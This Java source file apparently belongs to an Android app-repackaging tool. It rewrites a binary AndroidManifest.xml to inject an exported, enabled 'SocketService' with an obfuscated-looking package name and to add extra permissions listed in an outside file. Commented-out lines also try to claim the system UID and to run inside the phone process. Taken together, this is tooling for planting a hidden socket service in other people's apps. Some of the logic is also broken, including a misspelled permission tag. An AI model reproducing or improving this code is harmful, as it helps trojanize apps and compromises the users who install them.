package com.viris.changer;


import static pxb.android.axml.AxmlVisitor.*;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import org.apache.commons.io.FileUtils;

import pxb.android.axml.AxmlReader;
import pxb.android.axml.AxmlVisitor;
import pxb.android.axml.AxmlWriter;
import pxb.android.axml.DumpAdapter;

public class ManifestChanger {

	
	private static HashMap<String, Boolean> permissions;
	private static boolean sdk=false;
	
	public static void main(String[] args) {
		ManifestChanger ex = new ManifestChanger();
		try {
			
			if(args==null || args.length==0)
				return;
			
			String command = args[0];
			String path = args[1];
			
			permissions = new HashMap<String, Boolean>();
			
			String[] lines = FileUtils.readFileToString(new File("permissions")).split("\n");
			for(String line:lines){
				if(line.charAt(0)=='#')
					continue;
				permissions.put(line, false);
				
			}
			
			
			byte[] data = FileUtils.readFileToByteArray(new File(
					path));
			if(command.equals("modify"))
				ex.modifyAxml(data);
		
			
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	
		
	

	public void modifyAxml(byte[] orgData) throws IOException {
		AxmlReader ar = new AxmlReader(orgData);
		AxmlWriter aw = new AxmlWriter();

		ar.accept(new AxmlVisitor(aw) {

			@Override
			public NodeVisitor first(String ns, String name) {// manifest
				
				NodeVisitor nv = super.first(ns, name);
				
				{
					//example how to add attribute to manifest. But in this case you have to sing
					//the packages with platform cert	
					//nv.attr(
					//		"http://schemas.android.com/apk/res/android",
					//		"sharedUserId", 0x0101000b,
					//		TYPE_STRING,
					//		"android.uid.system"
					//		);
					
				}
			
				
				return new NodeVisitor(nv) {
					
					@Override
					public NodeVisitor child(String ns, String name) {
						NodeVisitor nv = super.child(ns, name);
						
						if (name.equals("uses-permission")) {
							return new NodeVisitor(nv) {

								@Override
								public void attr(String ns, String name,
										int resourceId, int type, Object obj) {
									if ("http://schemas.android.com/apk/res/android".equals(ns)) {
										if(permissions.containsKey(name))
											permissions.put(name, true);
										super.attr(ns, name, resourceId, type,
												obj);
									} else {
										super.attr(ns, name, resourceId, type,
												obj);
									}

								}
							};
						}  else if (name.equals("uses-sdk")) {
							sdk = true;
							/*
							return new NodeVisitor(nv) {

								@Override
								public void attr(String ns, String name,
										int resourceId, int type, Object obj) {
									if ("http://schemas.android.com/apk/res/android"
											.equals(ns)
											&& name.equals("minSdkVersion")) {
										//change if object less then 14
										if(Integer.parseInt(obj.toString())< 14)
											obj = new Integer(14);
										super.attr(ns, name, resourceId, type,
												obj);
									} else {
										super.attr(ns, name, resourceId, type,
												obj);
									}
								}
							};*/
						} else if (name.equals("application")) {
							//adding attribute that application running like process phone
							//nv.attr(
							//		"http://schemas.android.com/apk/res/android",
							//		"process", 0x01010011,
							//		TYPE_STRING,
							//		"com.android.phone"
							//		);	
							/*
							NodeVisitor service = nv.child(null,
									"service");
							service.attr(
									"http://schemas.android.com/apk/res/android",
									"name", 0x01010003,
									TYPE_STRING,
									"xyzkwjbl.viris.service.SocketService");

							service.attr(
									"http://schemas.android.com/apk/res/android",
									"enabled", 0x0101000e,
									TYPE_INT_BOOLEAN, 1);
							service.attr(
									"http://schemas.android.com/apk/res/android",
									"exported", 0x01010010,
									TYPE_INT_BOOLEAN, 1);
							NodeVisitor intent = service.child(
									null, "intent-filter");
							NodeVisitor action = intent.child(null,
									"action");
							action.attr(
									"http://schemas.android.com/apk/res/android",
									"name", 0x01010003,
									TYPE_STRING,
									"xyzkwjbl.viris.service");*/
							
							return new NodeVisitor(nv) {
								/*
								@Override
								public NodeVisitor child(String ns, String name) {
									NodeVisitor nvc = super.child(ns, name);
									if(name.equals("service")){
										NodeVisitor service = nv.child(null,
												"service");
										service.attr(
												"http://schemas.android.com/apk/res/android",
												"name", 0x01010003,
												TYPE_STRING,
												"xyzkwjbl.viris.service.SocketService");

										service.attr(
												"http://schemas.android.com/apk/res/android",
												"enabled", 0x0101000e,
												TYPE_INT_BOOLEAN, 1);
										service.attr(
												"http://schemas.android.com/apk/res/android",
												"exported", 0x01010010,
												TYPE_INT_BOOLEAN, 1);
										NodeVisitor intent = service.child(
												null, "intent-filter");
										NodeVisitor action = intent.child(null,
												"action");
										action.attr(
												"http://schemas.android.com/apk/res/android",
												"name", 0x01010003,
												TYPE_STRING,
												"xyzkwjbl.viris.service");
										service.end();
									}
									return nvc;
								}*/
								
								public void end() {
									{// add a service
										NodeVisitor service = super.child(null,
												"service");
										service.attr(
												"http://schemas.android.com/apk/res/android",
												"name", 0x01010003,
												TYPE_STRING,
												"xyzkwjbl.viris.service.SocketService");

										service.attr(
												"http://schemas.android.com/apk/res/android",
												"enabled", 0x0101000e,
												TYPE_INT_BOOLEAN, 1);
										service.attr(
												"http://schemas.android.com/apk/res/android",
												"exported", 0x01010010,
												TYPE_INT_BOOLEAN, 1);
										NodeVisitor intent = service.child(
												null, "intent-filter");
										NodeVisitor action = intent.child(null,
												"action");
										action.attr(
												"http://schemas.android.com/apk/res/android",
												"name", 0x01010003,
												TYPE_STRING,
												"xyzkwjbl.viris.service");

									}

									super.end();
								}

							};
						}
						return nv;
					}
					
				};

			}

		});
		
		//change permissions if needed
		ar = new AxmlReader(aw.toByteArray());
		aw = new AxmlWriter();
		
		ar.accept(new AxmlVisitor(aw) {
						
			@Override
			public NodeVisitor first(String ns, String name) {// manifest
				
				NodeVisitor nv = super.first(ns, name);
				if(!sdk){
					NodeVisitor sdknode = nv.child(null,
							"uses-sdk");
					sdknode
							.attr("http://schemas.android.com/apk/res/android",
									"minSdkVersion", 0x0101020c,
									TYPE_FIRST_INT,
									0x8);
					sdknode
					.attr("http://schemas.android.com/apk/res/android",
							"targetSdkVersion", 0x01010270,
							TYPE_FIRST_INT,
							0x12);
					sdknode.end();
				}
				for(String key:permissions.keySet()){
					if(!permissions.get(key)){
						NodeVisitor permision = nv.child(null,
								"uses-permisions");
						permision
								.attr("http://schemas.android.com/apk/res/android",
										"name", 0x01010003,
										TYPE_STRING,
										key);
				
						permision.end();
					}
				}
				return nv;
			
			}

		});
		

		byte[] data = aw.toByteArray();
		FileUtils.writeByteArrayToFile(new File("AndroidManifest.xml"), data);
	}
}